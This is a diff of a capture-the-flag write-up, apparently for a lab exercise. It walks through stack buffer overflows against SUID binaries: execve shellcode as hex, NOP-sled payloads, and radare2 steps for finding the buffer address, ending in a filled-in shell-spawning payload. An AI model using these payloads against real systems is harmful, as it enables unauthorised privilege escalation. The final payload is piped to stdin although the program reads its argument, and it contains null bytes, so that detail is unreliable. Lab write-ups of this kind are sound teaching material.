@@ -516,7 +516,7 @@ Little‑endian 8‑byte form: 67 05 40 00 00 00 00 00
 
 So your final payload is:
 ```
-python3 -c 'print("A"*14 + "\x67\x05\x40\x00\x00\x00\x00\x00")' | ./func-pointer
+python -c 'print("A"*14 + "\x67\x05\x40\x00\x00\x00\x00\x00")' | ./func-pointer
 ```
 
 You should see: 
@@ -532,6 +532,8 @@ What this does is it fills buffer to limit 14 then fills the location of the var
 # Task 8 Buffer Overflow
 
 Simple explanation of this challenge
+
+First of this is the code we will be working with:
 ```
 [...overflow-3]$ cat buffer-overflow.c
 #include <stdio.h>
@@ -551,7 +553,10 @@ int main(int argc, char **argv)
     copy_arg(argv[1]);
 }
 ```
-Note the goal is to read the secret.txt file, the program has suid bit set. When any user runs this program, it executes with the permissions of the file’s owner (user2). So user1 temporarily becomes user2 for the duration of program. Idea is to spawn a shell within program t allow secret.txt file to read.
+- The goal is to read the secret.txt file
+- The program buffer-overflow has suid bit set.
+- When any user runs this program, it executes with the permissions of the file’s owner (user2). So user1 temporarily becomes user2 for the duration of program.
+- Idea is to spawn a shell within program t allow secret.txt file to read.
 
 ```
 [user1@ip-10-49-146-85 overflow-3]$ ls -la
@@ -582,8 +587,7 @@ Goal:
 - Use this to spawn a shell (then read secret.txt via the SUID binary).
 
 ## Normal stack frame for copy_arg (before overflow):
-
-text
+```
           +---------------------------+
           |       Stack Bottom        |
           +---------------------------+
@@ -599,10 +603,9 @@ text
           |        Stack Top          |
           +---------------------------+
 Data is written from buffer[0] upwards in memory toward the return address.
-
+```
 ## After you overflow buffer with shellcode + junk + address:
-
-text
+```
           +---------------------------------------------+
           |                 Stack Bottom                |
           +---------------------------------------------+
@@ -617,10 +620,9 @@ text
           |                 Stack Top                   |
           +---------------------------------------------+
 When copy_arg returns, it uses the overwritten return address, which now points into your buffer (NOP sled + shellcode).
-
+```
 ## Your payload in memory (what strcpy writes into buffer and beyond):
-
-text
+```
 +-------------+-------------+-----------------+
 |  NOP Sled   |  Shellcode  | Return Address  |
 +-------------+-------------+-----------------+
@@ -637,16 +639,23 @@ You might structure it like this:
 [ Shellcode (~30 bytes) ]
 [ Padding / junk (~50 bytes) ]
 [ Overwritten return address (8 bytes) ]
+```
 
 - That totals roughly 140 + 8 bytes (8 is the overflow).
 - The NOP sled doesn’t have to fill the entire buffer — it just needs to be large enough to absorb small address misalignments. 
 - The junk code can be anything and the overwritten part is the address that leads to somewhere in the nop sled that leads to the shell code
-- - Where our shell code for this example used is a bash shell in hex:
+- Where our shell code for this example used is a bash shell in hex:
 ```
 "\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05" 
 ```
 
 So the actual Python payload looks like:
+
+Here is form first: 
+```
+python -c "print (NOP * no_of_nops + shellcode + random_data * no_of_random_data + memory address)"
+```
+What it should resemble:
 ```
 python -c 'print(
     "\x90" * NOP_COUNT +
@@ -693,5 +702,147 @@ python -c 'print(
     "\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05" +
     "A" * 58 +
     "\xAA\xBB\xCC\xDD\xEE\xFF\x00\x00"  # replace with real little-endian buffer address
+)' | ./buffer-overflow
+
+./buffer-overflow $(python -c "print '\x90'*100+'\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'A'*12 + '\x98\xe2\xff\xff\xff\x7f'")
+```
+
+## That was example but we need to obtain the return address for buffer:
+
+Starting from the overflow-3 folder
+```
+[user1@ip-10-49-146-85 overflow-3]$ ls
+buffer-overflow    secret.txt
+buffer-overflow.c
+```
+start the radare on script running:
+```
+[user1@ip-10-49-146-85 overflow-3]$ radare2 -d ./buffer-overflow
+Process with PID 18104 started...
+= attach 18104 18104
+bin.baddr 0x00400000
+Using 0x400000
+asm.bits 64
+ -- Switch between print modes using the 'p' and 'P' keys in visual mode
+```
+'aaa' to analyse
+```
+[0x7ffff7dd9ef0]> aaa
+[ ] Analyze all flags starting with sym.[Cannot analyze at 0x00600ff0
+Invalid address from 0x004005e9
+[x] Analyze all flags starting with sym. and entry0 (aa)
+[Warning: Invalid range. Use different search.in=? or anal.in=dbg.maps.x
+Warning: Invalid range. Use different search.in=? or anal.in=dbg.maps.x
+[x] Analyze function calls (aac)
+[ ] Analyze len bytes of instructions fo[x] Analyze len bytes of instructions for references (aar)
+[x] Check for objc references
+[x] Check for vtables
+[ ] Type matching analysis for all funct[TOFIX: aaft can't run in debugger mode.
+[x] Type matching analysis for all functions (aaft)
+[x] Propagate noreturn information
+[ ] Use -AA or aaaa to perform additiona[x] Use -AA or aaaa to perform additional experimental analysis.
+```
+Set breakpoint BEFORE running:
+```
+[0x7ffff7dd9ef0]> db sym.copy_arg
+[0x7ffff7dd9ef0]> 
+```
+Run the program with any argument:
+```
+[0x7ffff7dd9ef0]> ood AAAA
+Wait event received by different pid 18104
+Process with PID 18106 started...
+= attach 18106 18106
+File dbg:///home/user1/overflow-3/buffer-overflow  AAAA reopened in read-write mode
+18106
+[0x7ffff7dd9ef0]> 
+[0x7ffff7dd9ef0]> dc
+```
+Now radare2 will stop inside copy_arg.
+
+You should see:
+```
+Here's a program that echo's out your input
+hit breakpoint at: 400527
+[0x00400527]>
+```
+Get the actual stack addresses of locals:
+```
+[0x00400527]> afvd
+arg arg1 =   : rdi : 0x7fffffffe6aa
+var var_98h = 0x7fffffffe2c8 = (qword)0x0000000000400630
+var var_90h = 0x7fffffffe2d0 = (qword)0x00007ffff7dd0400
+```
+Identify which offset is buffer:
+```
+[0x00400527]> pdf @ sym.copy_arg
+            ;-- rip:
+\u250c 61: sym.copy_arg (int64_t arg1);
+\u2502           ; var int64_t var_98h @ rbp-0x98
+\u2502           ; var int64_t var_90h @ rbp-0x90
+\u2502           ; arg int64_t arg1 @ rdi
+\u2502           ; CALL XREF from main @ 0x40058b
+\u2502           0x00400527 b    55             push rbp
+\u2502           0x00400528      4889e5         mov rbp, rsp
+\u2502           0x0040052b      4881eca00000.  sub rsp, 0xa0
+\u2502           0x00400532      4889bd68ffff.  mov qword [var_98h], rdi    ; arg1
+\u2502           0x00400539      488b9568ffff.  mov rdx, qword [var_98h]
+\u2502           0x00400540      488d8570ffff.  lea rax, [var_90h]
+\u2502           0x00400547      4889d6         mov rsi, rdx
+\u2502           0x0040054a      4889c7         mov rdi, rax
+\u2502           0x0040054d      e8defeffff     call sym.imp.strcpy         ; char *strcpy(char *dest, const char *src)
+\u2502           0x00400552      488d8570ffff.  lea rax, [var_90h]
+\u2502           0x00400559      4889c7         mov rdi, rax
+\u2502           0x0040055c      e8dffeffff     call sym.imp.puts           ; int puts(const char *s)
+\u2502           0x00400561      90             nop
+\u2502           0x00400562      c9             leave
+\u2514           0x00400563      c3             ret
+[0x00400527]> 
+
+```
+- 0x00400540 is a code address (an instruction inside copy_arg).
+- buffer lives on the stack, not in the code section.
+
+The relevant lines you showed:
+
+In assembly language from pdf @ sym.copy_arg
+```
+; var int64_t var_98h @ rbp-0x98
+; var int64_t var_90h @ rbp-0x90
+
+0x00400540      488d8570ffff.  lea rax, [var_90h]
+...
+0x0040054d      e8defeffff     call sym.imp.strcpy
+```
+This means:
+
+strcpy destination (buffer) = [rbp-0x90] = var_90h
+
+So buffer starts at var_90h.
+
+2. What is the runtime address of buffer?
+From your afvd:
+
+text
+var var_90h = 0x7fffffffe2d0 = (qword)0x00007ffff7dd0400
+So:
+
+buffer start address = 0x7fffffffe2d0
+
+That’s the value you want to overwrite the return address with (or somewhere into your NOP sled if you adjust).
+
+### Convert that to little‑endian bytes
+Address: 0x7fffffffe2d0
+
+Little‑endian: d0 e2 ff ff ff 7f 00 00
+Python string: "\xd0\xe2\xff\xff\xff\x7f\x00\x00"
+
+### Drop this into your payload:
+```
+python -c 'print(
+    "\x90" * 60 +
+    "\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05" +
+    "A" * 58 +
+    "\xd0\xe2\xff\xff\xff\x7f\x00\x00"
 )' | ./buffer-overflow
 ```
